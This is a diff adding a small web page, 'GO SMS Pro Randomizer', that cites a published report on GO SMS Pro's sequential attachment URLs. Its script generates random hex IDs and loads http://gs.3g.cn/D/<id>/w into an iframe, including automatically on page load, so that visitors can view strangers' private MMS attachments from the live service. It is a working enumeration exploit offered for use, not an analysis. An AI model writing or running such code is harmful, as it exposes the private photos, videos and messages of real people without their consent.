@@ -1,0 +1,34 @@
+<!-- start at 10001 end somewhere around 15106600 -->
+
+<html>
+
+<head>
+    <meta charset="utf-8">
+
+    <title>GO SMS Pro Random Attachment</title>
+    <div style="margin: auto; max-width: 600;">
+        <h1>GO SMS Pro Randomizer</h1>
+        <p>A vulnerability was recently made public showing that GO SMS Pro uses a sequential value in the URLs that are
+            generated to view MMS attachments. Click the button below to view a random attachment!</p>
+        <p>View the <a
+                href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/go-sms-pro-vulnerable-to-media-file-theft/"
+                target="_blank">Trustwave Report</a></p>
+        <button onClick=generate() style="display: block; margin: 20px auto;">Randomize</button>
+        <iframe src="demo_iframe.htm" id='iframe' style="max-height: 1200px; max-width: 500px; height: 70vh; width: 50vw; margin: auto; display: block;"></iframe>
+    </div>
+</head>
+
+<body>
+    <script>
+        function generate() {
+            var hex = Math.floor(Math.random() * 15106600).toString(16);
+            var url = `http://gs.3g.cn/D/${hex}/w`;
+            console.log(url);
+            document.getElementById('iframe').src = url;
+        }
+        //run on first page load
+        generate();
+    </script>
+</body>
+
+</html>
